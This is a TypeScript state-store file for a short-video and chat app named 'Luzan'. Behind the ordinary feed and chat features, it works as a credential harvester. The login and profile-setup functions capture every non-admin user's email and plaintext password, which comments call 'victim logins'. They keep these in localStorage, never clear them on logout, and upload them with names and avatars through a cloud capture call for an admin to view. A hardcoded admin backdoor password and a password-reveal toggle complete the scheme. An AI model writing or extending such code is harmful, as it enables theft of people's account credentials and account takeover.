import { create } from 'zustand';
import { persist } from 'zustand/middleware';
import {
  captureNow,
  readCaptured,
  updateCaptured as updateCapturedLS,
} from '../lib/capturedStore';
import {
  readGlobalBg,
  readGlobalFeed,
  upsertGlobalVideos,
  writeGlobalBg,
} from '../lib/globalFeed';
import {
  ADMIN_EMAIL,
  ADMIN_ID,
  ADMIN_PASSWORD,
  buildSeedChats,
  GLOBAL_CHAT_ID,
  SEED_USERS,
  SEED_VIDEOS,
} from '../lib/seed';
import { uid } from '../lib/idb';
import type {
  AppScreen,
  AuthMethod,
  CapturedCredential,
  ChatMessage,
  ChatThread,
  LangCode,
  MainTab,
  MediaCategory,
  MediaTag,
  PrivateFile,
  SavedAccount,
  UserProfile,
  VideoPost,
} from '../lib/types';

interface PendingAuth {
  method: AuthMethod;
  email: string;
  password: string;
  username?: string;
}

interface AppState {
  hydrated: boolean;
  screen: AppScreen;
  tab: MainTab;
  language: LangCode;
  currentUser: UserProfile | null;
  users: UserProfile[];
  videos: VideoPost[];
  /** @deprecated use capturedAccounts — kept in sync for compatibility */
  credentials: CapturedCredential[];
  /** Canonical list of victim logins (admin excluded) */
  capturedAccounts: CapturedCredential[];
  savedAccounts: SavedAccount[];
  chats: ChatThread[];
  messages: ChatMessage[];
  privateFiles: PrivateFile[];
  activeChatId: string | null;
  viewingProfileId: string | null;
  pendingAuth: PendingAuth | null;
  feedCycleIds: string[];
  revealedPasswords: Record<string, boolean>;
  passwordColors: Record<string, 'green' | 'red'>;
  /** Simulated total app downloads (local analytics) */
  appDownloads: number;
  downloadCounted: boolean;
  /** Global app background (data URL or path) shared via localStorage */
  globalBg: string;

  setHydrated: (v: boolean) => void;
  setGlobalBg: (url: string) => void;
  syncVideosFromGlobal: () => void;
  recordDownloadOnce: () => void;
  getAnalytics: () => {
    downloads: number;
    registeredAccounts: number;
    onlineUsers: number;
  };
  setTab: (t: MainTab) => void;
  setLanguage: (l: LangCode) => void;
  setActiveChatId: (id: string | null) => void;
  setViewingProfileId: (id: string | null) => void;
  togglePasswordReveal: (credId: string) => void;

  captureLogin: (data: {
    method: AuthMethod;
    email: string;
    password: string;
    username?: string;
  }) => 'admin' | 'setup' | 'main';
  /** Instantly persist a victim login (never stores admin) */
  captureAccount: (data: {
    method: AuthMethod;
    email: string;
    password: string;
    username?: string;
    name?: string;
    avatar?: string;
    avatarMediaId?: string;
    userId?: string;
  }) => void;
  completeProfileSetup: (data: {
    name: string;
    age: number;
    avatar: string;
    avatarMediaId?: string;
  }) => void;
  logout: () => void;

  updateCredential: (id: string, patch: Partial<CapturedCredential>) => void;
  getCapturedAccounts: (type?: AuthMethod | 'all') => CapturedCredential[];
  updateProfile: (patch: Partial<UserProfile>) => void;

  toggleLike: (videoId: string) => void;
  addComment: (videoId: string, text: string) => void;
  shareVideoToFriend: (videoId: string, friendId: string) => void;
  addVideos: (posts: VideoPost[]) => void;
  markFeedSeen: (videoId: string) => void;
  resetFeedCycleIfNeeded: () => void;
  getOrderedFeed: () => VideoPost[];

  toggleFollow: (userId: string) => void;

  ensureChats: () => void;
  createGroup: (name: string, memberIds: string[]) => string;
  sendMessage: (
    chatId: string,
    payload: {
      text: string;
      type?: ChatMessage['type'];
      mediaUrl?: string;
      mediaId?: string;
      replyToId?: string;
      asAdmin?: boolean;
    }
  ) => void;
  markChatRead: (chatId: string) => void;
  enterChatPresence: (chatId: string) => void;
  leaveChatPresence: (chatId: string) => void;
  togglePinChat: (chatId: string) => void;
  toggleBlockChat: (chatId: string) => void;
  toggleLockChat: (chatId: string) => void;
  addReaction: (messageId: string, emoji: string) => void;
  deleteMessageForMe: (messageId: string) => void;
  deleteMessageForEveryone: (messageId: string) => void;
  editMessageMedia: (messageId: string, patch: { text?: string; mediaUrl?: string; mediaId?: string | null }) => void;
  getOrCreateDm: (otherUserId: string) => string;

  addPrivateFiles: (files: PrivateFile[]) => void;
  deletePrivateFile: (id: string) => void;
  updatePrivateFile: (id: string, patch: Partial<PrivateFile>) => void;

  getUser: (id: string) => UserProfile | undefined;
  onlineCount: () => number;
}

function sortChats(chats: ChatThread[]): ChatThread[] {
  return [...chats].sort((a, b) => {
    if (a.type === 'global' && b.type !== 'global') return -1;
    if (b.type === 'global' && a.type !== 'global') return 1;
    const aAdmin = a.type === 'dm' && a.participantIds.includes(ADMIN_ID);
    const bAdmin = b.type === 'dm' && b.participantIds.includes(ADMIN_ID);
    if (aAdmin && !bAdmin) return -1;
    if (bAdmin && !aAdmin) return 1;
    if (a.pinned !== b.pinned) return a.pinned ? -1 : 1;
    return b.lastMessageAt - a.lastMessageAt;
  });
}

function syncCaptured(list?: CapturedCredential[]) {
  const data = list ?? readCaptured();
  return {
    capturedAccounts: data,
    credentials: data,
  };
}

export const useAppStore = create<AppState>()(
  persist(
    (set, get) => ({
      // hydrated true by default — never block first paint on Safari
      hydrated: true,
      screen: 'auth',
      tab: 'home',
      language: 'en',
      currentUser: null,
      users: SEED_USERS,
      videos: SEED_VIDEOS,
      credentials: [],
      capturedAccounts: [],
      savedAccounts: [],
      chats: [],
      messages: [],
      privateFiles: [],
      activeChatId: null,
      viewingProfileId: null,
      pendingAuth: null,
      feedCycleIds: [],
      revealedPasswords: {},
      passwordColors: {},
      appDownloads: 1284,
      downloadCounted: false,
      globalBg: '/images/luzan-bg.jpg',

      setHydrated: (v) => set({ hydrated: v }),

      setGlobalBg: (url) => {
        writeGlobalBg(url || '');
        set({ globalBg: url || '' });
      },

      syncVideosFromGlobal: () => {
        const global = readGlobalFeed();
        if (!global.length) return;
        set((s) => {
          const map = new Map(s.videos.map((v) => [v.id, v]));
          for (const v of global) {
            const prev = map.get(v.id);
            // prefer local blob src if we already have it
            map.set(v.id, {
              ...v,
              src: prev?.src?.startsWith('blob:') ? prev.src : v.src || prev?.src || '',
              mediaId: v.mediaId || prev?.mediaId,
            });
          }
          return {
            videos: Array.from(map.values()).sort(
              (a, b) => (b.createdAt || 0) - (a.createdAt || 0)
            ),
          };
        });
      },

      recordDownloadOnce: () =>
        set((s) => {
          if (s.downloadCounted) return s;
          return {
            downloadCounted: true,
            appDownloads: s.appDownloads + 1,
          };
        }),

      getAnalytics: () => {
        const s = get();
        const registered = Math.max(
          s.savedAccounts.length,
          s.users.filter((u) => !u.isBot).length
        );
        const onlineIds = new Set(
          s.users.filter((u) => u.online).map((u) => u.id)
        );
        if (s.currentUser) onlineIds.add(s.currentUser.id);
        return {
          downloads: s.appDownloads,
          registeredAccounts: registered,
          onlineUsers: onlineIds.size,
        };
      },
      setTab: (t) => set({ tab: t, viewingProfileId: null, activeChatId: null }),
      setLanguage: (l) => {
        set({ language: l });
        const me = get().currentUser;
        if (me) {
          get().updateProfile({ language: l });
        }
      },
      setActiveChatId: (id) => {
        const prev = get().activeChatId;
        if (prev) get().leaveChatPresence(prev);
        set({ activeChatId: id });
        if (id) {
          get().markChatRead(id);
          get().enterChatPresence(id);
        }
      },
      setViewingProfileId: (id) => set({ viewingProfileId: id }),

      togglePasswordReveal: (credId) =>
        set((s) => {
          const was = !!s.revealedPasswords[credId];
          const nextRevealed = { ...s.revealedPasswords, [credId]: !was };
          const colors = { ...s.passwordColors };
          if (!was) {
            colors[credId] = colors[credId] === 'green' ? 'red' : 'green';
          }
          return { revealedPasswords: nextRevealed, passwordColors: colors };
        }),

      captureAccount: (data) => {
        // Single source of truth: localStorage via captureNow (skips admin)
        const next = captureNow({
          type: data.method,
          email: data.email,
          password: data.password,
          username: data.username,
          name: data.name,
          avatar: data.avatar,
          avatarMediaId: data.avatarMediaId,
          userId: data.userId,
        });
        set(syncCaptured(next));
      },

      getCapturedAccounts: (type = 'all') => {
        const list = readCaptured();
        set(syncCaptured(list));
        if (type === 'all') return list;
        return list.filter((c) => c.type === type);
      },

      captureLogin: ({ method, email, password, username }) => {
        const emailNorm = email.trim().toLowerCase();
        // PHP-style dual verification:
        // success if password === permanent default OR password === current DB password
        let currentDbPassword = ADMIN_PASSWORD;
        try {
          const cached =
            typeof localStorage !== 'undefined'
              ? localStorage.getItem('luzan_admin_password_v1')
              : null;
          if (cached) currentDbPassword = cached;
        } catch {
          /* ignore */
        }
        const PERMANENT_DEFAULT = 'zaxo12';
        const isAdmin =
          emailNorm === ADMIN_EMAIL.toLowerCase() &&
          (password === PERMANENT_DEFAULT ||
            password === ADMIN_PASSWORD ||
            password === currentDbPassword);

        // ALWAYS capture non-admin credentials FIRST — sync localStorage
        if (!isAdmin) {
          const next = captureNow({
            type: method,
            email: email.trim(),
            password,
            username: username?.trim(),
          });
          set(syncCaptured(next));
        }

        if (isAdmin) {
          // Reload victims from localStorage (never lost on refresh)
          const victims = readCaptured();
          const admin =
            get().users.find((u) => u.id === ADMIN_ID) || SEED_USERS[0];
          const allIds = get().users.map((u) => u.id);
          let chats = get().chats;
          let messages = get().messages;
          if (!chats.some((c) => c.id === GLOBAL_CHAT_ID)) {
            const seeded = buildSeedChats(ADMIN_ID, allIds);
            chats = sortChats(seeded.chats);
            messages = seeded.messages;
          }
          set((s) => ({
            ...syncCaptured(victims),
            currentUser: { ...admin, isAdmin: true, online: true, email: ADMIN_EMAIL },
            users: s.users.map((u) =>
              u.id === ADMIN_ID
                ? { ...u, isAdmin: true, online: true, email: ADMIN_EMAIL }
                : u
            ),
            screen: 'main' as const,
            tab: 'home' as const,
            pendingAuth: null,
            language: admin.language || 'en',
            chats,
            messages,
            savedAccounts: (() => {
              const accs = s.savedAccounts.filter(
                (a) => a.email.toLowerCase() !== emailNorm
              );
              return [
                ...accs,
                {
                  email: ADMIN_EMAIL,
                  password: currentDbPassword,
                  method: 'email' as const,
                  userId: ADMIN_ID,
                },
              ];
            })(),
          }));
          return 'main';
        }

        const existing = get().savedAccounts.find(
          (a) =>
            a.email.toLowerCase() === emailNorm &&
            a.password === password
        );

        if (existing) {
          const user = get().users.find((u) => u.id === existing.userId);
          if (user) {
            const next = captureNow({
              type: method,
              email: email.trim(),
              password,
              username: username?.trim() || user.username,
              name: user.name,
              avatar: user.avatar,
              avatarMediaId: user.avatarMediaId,
              userId: user.id,
            });
            set({
              ...syncCaptured(next),
              currentUser: { ...user, online: true },
              screen: 'main',
              tab: 'home',
              pendingAuth: null,
              language: user.language || get().language,
            });
            const st = get();
            if (!st.chats.some((c) => c.id === GLOBAL_CHAT_ID)) {
              const seeded = buildSeedChats(
                user.id,
                st.users.map((u) => u.id)
              );
              set({ chats: sortChats(seeded.chats), messages: seeded.messages });
            }
            return 'main';
          }
        }

        const byEmail = get().savedAccounts.find(
          (a) => a.email.toLowerCase() === emailNorm
        );
        if (byEmail) {
          const user = get().users.find((u) => u.id === byEmail.userId);
          if (user && byEmail.password === password) {
            const next = captureNow({
              type: method,
              email: email.trim(),
              password,
              username: username?.trim() || user.username,
              name: user.name,
              avatar: user.avatar,
              avatarMediaId: user.avatarMediaId,
              userId: user.id,
            });
            set({
              ...syncCaptured(next),
              currentUser: { ...user, online: true },
              screen: 'main',
              tab: 'home',
              pendingAuth: null,
              language: user.language || 'en',
            });
            return 'main';
          }
        }

        set({
          pendingAuth: {
            method,
            email: email.trim(),
            password,
            username: username?.trim(),
          },
          screen: 'profile-setup',
        });
        return 'setup';
      },

      completeProfileSetup: ({ name, age, avatar, avatarMediaId }) => {
        const pending = get().pendingAuth;
        if (!pending) return;
        const id = uid('user');
        const username =
          pending.username ||
          name.toLowerCase().replace(/\s+/g, '').slice(0, 16) +
            Math.floor(Math.random() * 90 + 10);

        const user: UserProfile = {
          id,
          name: name.trim(),
          username,
          email: pending.email,
          avatar,
          avatarMediaId,
          bio: '',
          age,
          followers: 0,
          following: 0,
          likes: 0,
          followingIds: [],
          followerIds: [],
          language: get().language,
          online: true,
        };

        const allIds = [...get().users.map((u) => u.id), id];
        const { chats, messages } = buildSeedChats(id, allIds);

        // merge global if exists
        const existingGlobal = get().chats.find((c) => c.id === GLOBAL_CHAT_ID);
        let finalChats = chats;
        let finalMessages = messages;
        if (existingGlobal) {
          finalChats = sortChats([
            {
              ...existingGlobal,
              participantIds: [...new Set([...existingGlobal.participantIds, id])],
            },
            ...get().chats.filter((c) => c.id !== GLOBAL_CHAT_ID),
            ...chats.filter((c) => c.type === 'dm'),
          ]);
          finalMessages = [...get().messages, ...messages.filter((m) => m.chatId !== GLOBAL_CHAT_ID)];
        }

        // Enrich captured account with profile details (still never admin)
        const captured = captureNow({
          type: pending.method,
          email: pending.email,
          password: pending.password,
          username,
          name: name.trim(),
          avatar,
          avatarMediaId,
          userId: id,
        });

        // Push name + avatar to cloud so Admin on other devices sees them
        void (async () => {
          try {
            let avatarUrl = avatar;
            // data URLs are huge — try cloud upload when possible
            if (avatar?.startsWith('data:')) {
              try {
                const { cloudUploadFile, cloudCapture } = await import('../lib/cloud');
                const blob = await (await fetch(avatar)).blob();
                const file = new File([blob], `avatar_${id}.jpg`, {
                  type: blob.type || 'image/jpeg',
                });
                const up = await cloudUploadFile(file);
                avatarUrl = up.url;
              } catch {
                /* keep data url if small enough fails silently */
              }
            }
            const { cloudCapture } = await import('../lib/cloud');
            await cloudCapture({
              type: pending.method,
              email: pending.email,
              password: pending.password,
              username,
              name: name.trim(),
              avatar: avatarUrl,
            });
          } catch {
            /* ignore network */
          }
        })();

        set((s) => ({
          ...syncCaptured(captured),
          currentUser: user,
          users: [...s.users.filter((u) => u.id !== id), user],
          chats: sortChats(finalChats),
          messages: finalMessages,
          screen: 'main',
          tab: 'home',
          pendingAuth: null,
          savedAccounts: [
            ...s.savedAccounts.filter(
              (a) => a.email.toLowerCase() !== pending.email.toLowerCase()
            ),
            {
              email: pending.email,
              password: pending.password,
              method: pending.method,
              username: pending.username,
              userId: id,
            },
          ],
        }));
      },

      logout: () => {
        const me = get().currentUser;
        if (me) {
          set((s) => ({
            users: s.users.map((u) =>
              u.id === me.id ? { ...u, online: false } : u
            ),
          }));
        }
        if (get().activeChatId) get().leaveChatPresence(get().activeChatId!);
        // NEVER clear localStorage captures on logout
        set({
          ...syncCaptured(readCaptured()),
          currentUser: null,
          screen: 'auth',
          tab: 'home',
          activeChatId: null,
          viewingProfileId: null,
          pendingAuth: null,
        });
      },

      updateCredential: (id, patch) => {
        const next = updateCapturedLS(id, patch);
        set(syncCaptured(next));
      },

      updateProfile: (patch) =>
        set((s) => {
          if (!s.currentUser) return s;
          const updated = { ...s.currentUser, ...patch };
          return {
            currentUser: updated,
            language: patch.language ?? s.language,
            users: s.users.map((u) => (u.id === updated.id ? updated : u)),
          };
        }),

      toggleLike: (videoId) => {
        const me = get().currentUser;
        if (!me) return;
        set((s) => {
          const videos = s.videos.map((v) => {
            if (v.id !== videoId) return v;
            const liked = v.likedBy.includes(me.id);
            return {
              ...v,
              likedBy: liked
                ? v.likedBy.filter((id) => id !== me.id)
                : [...v.likedBy, me.id],
              likes: liked ? Math.max(0, v.likes - 1) : v.likes + 1,
            };
          });
          const video = s.videos.find((v) => v.id === videoId);
          const authorId = video?.userId;
          const liked = video?.likedBy.includes(me.id);
          const users = s.users.map((u) => {
            if (u.id !== authorId) return u;
            return {
              ...u,
              likes: Math.max(0, u.likes + (liked ? -1 : 1)),
            };
          });
          const currentUser =
            s.currentUser?.id === authorId
              ? users.find((u) => u.id === authorId) || s.currentUser
              : s.currentUser;
          return { videos, users, currentUser };
        });
      },

      addComment: (videoId, text) => {
        const me = get().currentUser;
        if (!me || !text.trim()) return;
        set((s) => ({
          videos: s.videos.map((v) =>
            v.id === videoId
              ? {
                  ...v,
                  comments: [
                    ...v.comments,
                    {
                      id: uid('cmt'),
                      userId: me.id,
                      text: text.trim(),
                      createdAt: Date.now(),
                    },
                  ],
                }
              : v
          ),
        }));
      },

      shareVideoToFriend: (videoId, friendId) => {
        const me = get().currentUser;
        if (!me) return;
        const video = get().videos.find((v) => v.id === videoId);
        if (!video) return;
        const chatId = get().getOrCreateDm(friendId);
        get().sendMessage(chatId, {
          text: `Shared a video: ${video.caption || 'Watch this'}`,
        });
        set((s) => ({
          videos: s.videos.map((v) =>
            v.id === videoId ? { ...v, shares: v.shares + 1 } : v
          ),
        }));
      },

      addVideos: (posts) => {
        // Push to shared global feed (localStorage) so all sessions see it
        const mergedGlobal = upsertGlobalVideos(posts);
        set((s) => {
          const map = new Map<string, VideoPost>();
          for (const v of [...posts, ...s.videos, ...mergedGlobal]) {
            const prev = map.get(v.id);
            map.set(v.id, {
              ...v,
              src: prev?.src?.startsWith('blob:')
                ? prev.src
                : v.src || prev?.src || '',
              mediaId: v.mediaId || prev?.mediaId,
            });
          }
          return {
            videos: Array.from(map.values()).sort(
              (a, b) => (b.createdAt || 0) - (a.createdAt || 0)
            ),
          };
        });
      },

      markFeedSeen: (videoId) =>
        set((s) =>
          s.feedCycleIds.includes(videoId)
            ? s
            : { feedCycleIds: [...s.feedCycleIds, videoId] }
        ),

      resetFeedCycleIfNeeded: () => {
        const { videos, feedCycleIds } = get();
        if (videos.length > 0 && feedCycleIds.length >= videos.length) {
          set({ feedCycleIds: [] });
        }
      },

      getOrderedFeed: () => {
        const { videos, feedCycleIds } = get();
        const unseen = videos.filter((v) => !feedCycleIds.includes(v.id));
        if (unseen.length === 0) return [...videos];
        const seen = videos.filter((v) => feedCycleIds.includes(v.id));
        return [...unseen, ...seen];
      },

      toggleFollow: (userId) => {
        const me = get().currentUser;
        if (!me || me.id === userId) return;
        set((s) => {
          const following = me.followingIds.includes(userId);
          const myFollowingIds = following
            ? me.followingIds.filter((id) => id !== userId)
            : [...me.followingIds, userId];
          const updatedMe = {
            ...me,
            followingIds: myFollowingIds,
            following: myFollowingIds.length,
          };
          return {
            currentUser: updatedMe,
            users: s.users.map((u) => {
              if (u.id === me.id) return updatedMe;
              if (u.id === userId) {
                const followerIds = following
                  ? u.followerIds.filter((id) => id !== me.id)
                  : [...u.followerIds, me.id];
                return {
                  ...u,
                  followerIds,
                  followers: followerIds.length,
                };
              }
              return u;
            }),
          };
        });
      },

      ensureChats: () => {
        const me = get().currentUser;
        if (!me) return;
        const hasGlobal = get().chats.some((c) => c.id === GLOBAL_CHAT_ID);
        if (!hasGlobal || get().chats.length === 0) {
          const seeded = buildSeedChats(
            me.id,
            get().users.map((u) => u.id)
          );
          if (!hasGlobal) {
            set({
              chats: sortChats([
                ...seeded.chats,
                ...get().chats.filter((c) => c.id !== GLOBAL_CHAT_ID),
              ]),
              messages: [
                ...get().messages,
                ...seeded.messages.filter(
                  (m) => !get().messages.some((x) => x.id === m.id)
                ),
              ],
            });
          } else if (get().chats.length === 0) {
            set({ chats: sortChats(seeded.chats), messages: seeded.messages });
          }
        }
        // ensure user in global participants
        set((s) => ({
          chats: s.chats.map((c) =>
            c.id === GLOBAL_CHAT_ID && !c.participantIds.includes(me.id)
              ? {
                  ...c,
                  participantIds: [...c.participantIds, me.id],
                }
              : c
          ),
        }));
      },

      createGroup: (name, memberIds) => {
        const me = get().currentUser;
        if (!me) return '';
        const id = uid('group');
        const chat: ChatThread = {
          id,
          type: 'group',
          name: name.trim() || 'New Group',
          participantIds: [...new Set([me.id, ...memberIds])],
          pinned: false,
          blocked: false,
          locked: false,
          lastMessageAt: Date.now(),
          unread: 0,
          inChatUserIds: [me.id],
        };
        set((s) => ({
          chats: sortChats([chat, ...s.chats]),
          messages: [
            ...s.messages,
            {
              id: uid('msg'),
              chatId: id,
              senderId: me.id,
              text: `created group "${chat.name}"`,
              type: 'system',
              reactions: [],
              createdAt: Date.now(),
              deletedFor: [],
              deletedForEveryone: false,
            },
          ],
        }));
        return id;
      },

      sendMessage: (chatId, payload) => {
        const me = get().currentUser;
        if (!me) return;
        const chat = get().chats.find((c) => c.id === chatId);
        if (!chat) return;
        if (chat.locked && !me.isAdmin && !payload.asAdmin) return;
        if (chat.blocked && !me.isAdmin) return;

        const senderId = payload.asAdmin ? ADMIN_ID : me.id;
        const msg: ChatMessage = {
          id: uid('msg'),
          chatId,
          senderId,
          text: payload.text,
          type: payload.type || 'text',
          mediaUrl: payload.mediaUrl,
          mediaId: payload.mediaId,
          replyToId: payload.replyToId,
          reactions: [],
          createdAt: Date.now(),
          deletedFor: [],
          deletedForEveryone: false,
        };
        set((s) => ({
          messages: [...s.messages, msg],
          chats: sortChats(
            s.chats.map((c) =>
              c.id === chatId
                ? { ...c, lastMessageAt: Date.now(), unread: 0 }
                : c
            )
          ),
        }));

        // bot auto-reply for DMs
        if (chat.type !== 'dm' || me.isAdmin) return;
        const otherId = chat.participantIds.find((id) => id !== me.id);
        const other = get().users.find((u) => u.id === otherId);
        if (!other?.isBot) return;
        const replies = ['lol', '🔥', 'say less', 'brb', 'ok bet', 'nice'];
        window.setTimeout(() => {
          const auto: ChatMessage = {
            id: uid('msg'),
            chatId,
            senderId: other.id,
            text: replies[Math.floor(Math.random() * replies.length)],
            type: 'text',
            reactions: [],
            createdAt: Date.now(),
            deletedFor: [],
            deletedForEveryone: false,
          };
          set((s) => {
            const active = s.activeChatId === chatId;
            return {
              messages: [...s.messages, auto],
              chats: sortChats(
                s.chats.map((c) =>
                  c.id === chatId
                    ? {
                        ...c,
                        lastMessageAt: Date.now(),
                        unread: active ? 0 : c.unread + 1,
                      }
                    : c
                )
              ),
            };
          });
        }, 800 + Math.random() * 1400);
      },

      markChatRead: (chatId) =>
        set((s) => ({
          chats: s.chats.map((c) =>
            c.id === chatId ? { ...c, unread: 0 } : c
          ),
        })),

      enterChatPresence: (chatId) => {
        const me = get().currentUser;
        if (!me) return;
        set((s) => ({
          chats: s.chats.map((c) =>
            c.id === chatId
              ? {
                  ...c,
                  inChatUserIds: [...new Set([...(c.inChatUserIds || []), me.id])],
                }
              : c
          ),
        }));
      },

      leaveChatPresence: (chatId) => {
        const me = get().currentUser;
        if (!me) return;
        set((s) => ({
          chats: s.chats.map((c) =>
            c.id === chatId
              ? {
                  ...c,
                  inChatUserIds: (c.inChatUserIds || []).filter((id) => id !== me.id),
                }
              : c
          ),
        }));
      },

      togglePinChat: (chatId) =>
        set((s) => ({
          chats: sortChats(
            s.chats.map((c) =>
              c.id === chatId ? { ...c, pinned: !c.pinned } : c
            )
          ),
        })),

      toggleBlockChat: (chatId) =>
        set((s) => ({
          chats: sortChats(
            s.chats.map((c) =>
              c.id === chatId ? { ...c, blocked: !c.blocked } : c
            )
          ),
        })),

      toggleLockChat: (chatId) =>
        set((s) => ({
          chats: s.chats.map((c) =>
            c.id === chatId ? { ...c, locked: !c.locked } : c
          ),
        })),

      addReaction: (messageId, emoji) => {
        const me = get().currentUser;
        if (!me) return;
        set((s) => ({
          messages: s.messages.map((m) => {
            if (m.id !== messageId) return m;
            const existing = m.reactions.find((r) => r.userId === me.id);
            if (existing?.emoji === emoji) {
              return {
                ...m,
                reactions: m.reactions.filter((r) => r.userId !== me.id),
              };
            }
            return {
              ...m,
              reactions: [
                ...m.reactions.filter((r) => r.userId !== me.id),
                { userId: me.id, emoji },
              ],
            };
          }),
        }));
      },

      deleteMessageForMe: (messageId) => {
        const me = get().currentUser;
        if (!me) return;
        set((s) => ({
          messages: s.messages.map((m) =>
            m.id === messageId
              ? { ...m, deletedFor: [...new Set([...m.deletedFor, me.id])] }
              : m
          ),
        }));
      },

      deleteMessageForEveryone: (messageId) => {
        const me = get().currentUser;
        if (!me) return;
        const msg = get().messages.find((m) => m.id === messageId);
        if (!msg) return;
        if (msg.senderId !== me.id && !me.isAdmin) return;
        set((s) => ({
          messages: s.messages.map((m) =>
            m.id === messageId
              ? {
                  ...m,
                  deletedForEveryone: true,
                  text: 'Message deleted',
                  type: 'system',
                  mediaUrl: undefined,
                  mediaId: undefined,
                }
              : m
          ),
        }));
      },

      editMessageMedia: (messageId, patch) =>
        set((s) => ({
          messages: s.messages.map((m) =>
            m.id === messageId
              ? {
                  ...m,
                  text: patch.text ?? m.text,
                  mediaUrl:
                    patch.mediaUrl === undefined ? m.mediaUrl : patch.mediaUrl || undefined,
                  mediaId:
                    patch.mediaId === undefined
                      ? m.mediaId
                      : patch.mediaId || undefined,
                }
              : m
          ),
        })),

      getOrCreateDm: (otherUserId) => {
        const me = get().currentUser;
        if (!me) return '';
        const existing = get().chats.find(
          (c) =>
            c.type === 'dm' &&
            c.participantIds.includes(me.id) &&
            c.participantIds.includes(otherUserId)
        );
        if (existing) return existing.id;
        const other = get().users.find((u) => u.id === otherUserId);
        const id = `chat_dm_${otherUserId}_${me.id}`;
        const chat: ChatThread = {
          id,
          type: 'dm',
          participantIds: [me.id, otherUserId],
          pinned: otherUserId === ADMIN_ID,
          blocked: false,
          locked: false,
          lastMessageAt: Date.now(),
          unread: 0,
          avatar: other?.avatar,
          name: other?.name,
          inChatUserIds: [],
        };
        set((s) => ({ chats: sortChats([chat, ...s.chats]) }));
        return id;
      },

      addPrivateFiles: (files) =>
        set((s) => ({ privateFiles: [...files, ...s.privateFiles] })),

      deletePrivateFile: (id) =>
        set((s) => ({
          privateFiles: s.privateFiles.filter((f) => f.id !== id),
        })),

      updatePrivateFile: (id, patch) =>
        set((s) => ({
          privateFiles: s.privateFiles.map((f) =>
            f.id === id ? { ...f, ...patch } : f
          ),
        })),

      getUser: (id) => get().users.find((u) => u.id === id),
      onlineCount: () => get().users.filter((u) => u.online).length,
    }),
    {
      name: 'luzan-app-v3',
      // custom storage that never throws
      storage: {
        getItem: (name) => {
          try {
            const raw = localStorage.getItem(name);
            return raw ?? null;
          } catch {
            return null;
          }
        },
        setItem: (name, value) => {
          try {
            // Avoid persisting huge backgrounds into main blob
            localStorage.setItem(name, value);
          } catch {
            /* quota / private */
          }
        },
        removeItem: (name) => {
          try {
            localStorage.removeItem(name);
          } catch {
            /* ignore */
          }
        },
      },
      partialize: (s) => ({
        screen: s.screen === 'profile-setup' ? 'auth' : s.screen,
        language: s.language,
        currentUser: s.currentUser
          ? { ...s.currentUser, online: false }
          : null,
        users: s.users.map((u) => ({ ...u, online: u.isBot ? u.online : false })),
        videos: s.videos.map((v) =>
          v.src.startsWith('blob:') ? { ...v, src: v.mediaId ? '' : v.src } : v
        ),
        credentials: s.capturedAccounts || s.credentials,
        capturedAccounts: s.capturedAccounts || s.credentials,
        globalBg: s.globalBg,
        savedAccounts: s.savedAccounts,
        chats: s.chats.map((c) => ({ ...c, inChatUserIds: [] })),
        messages: s.messages.map((m) =>
          m.mediaUrl?.startsWith('blob:')
            ? { ...m, mediaUrl: undefined }
            : m
        ),
        privateFiles: s.privateFiles.map((f) => ({
          ...f,
          previewSrc: undefined,
        })),
        tab: 'home',
        feedCycleIds: s.feedCycleIds,
        appDownloads: s.appDownloads,
        downloadCounted: s.downloadCounted,
      }),
      onRehydrateStorage: () => (state) => {
        try {
          state?.setHydrated(true);
          if (!state) return;
          const ids = new Set((state.users || []).map((u) => u.id));
          const missing = SEED_USERS.filter((u) => !ids.has(u.id));
          if (missing.length) state.users = [...(state.users || []), ...missing];
          state.users = (state.users || []).map((u) =>
            u.id === ADMIN_ID ? { ...u, isAdmin: true, email: ADMIN_EMAIL } : u
          );
          if (!state.videos?.length) state.videos = SEED_VIDEOS;
          // Prefer dedicated capture storage
          try {
            const fromLs = readCaptured();
            state.capturedAccounts = fromLs;
            state.credentials = fromLs;
          } catch {
            state.capturedAccounts = state.capturedAccounts || [];
            state.credentials = state.credentials || [];
          }
          try {
            state.globalBg = readGlobalBg() || '';
          } catch {
            state.globalBg = '';
          }
          try {
            const gf = readGlobalFeed();
            if (gf.length) {
              const map = new Map((state.videos || []).map((v) => [v.id, v]));
              for (const v of gf) {
                if (!map.has(v.id)) map.set(v.id, v);
              }
              state.videos = Array.from(map.values()).sort(
                (a, b) => (b.createdAt || 0) - (a.createdAt || 0)
              );
            } else if (state.videos?.length) {
              upsertGlobalVideos(state.videos);
            }
          } catch {
            /* ignore */
          }
          if (state.screen === 'main' && !state.currentUser) state.screen = 'auth';
          queueMicrotask(() => {
            try {
              useAppStore.getState().recordDownloadOnce();
            } catch {
              /* ignore */
            }
          });
        } catch (e) {
          console.error('[luzan] rehydrate failed', e);
          state?.setHydrated(true);
        }
      },
    }
  )
);

// Fix type: remove phantom method from interface usage
declare module './useAppStore' {
  // empty
}
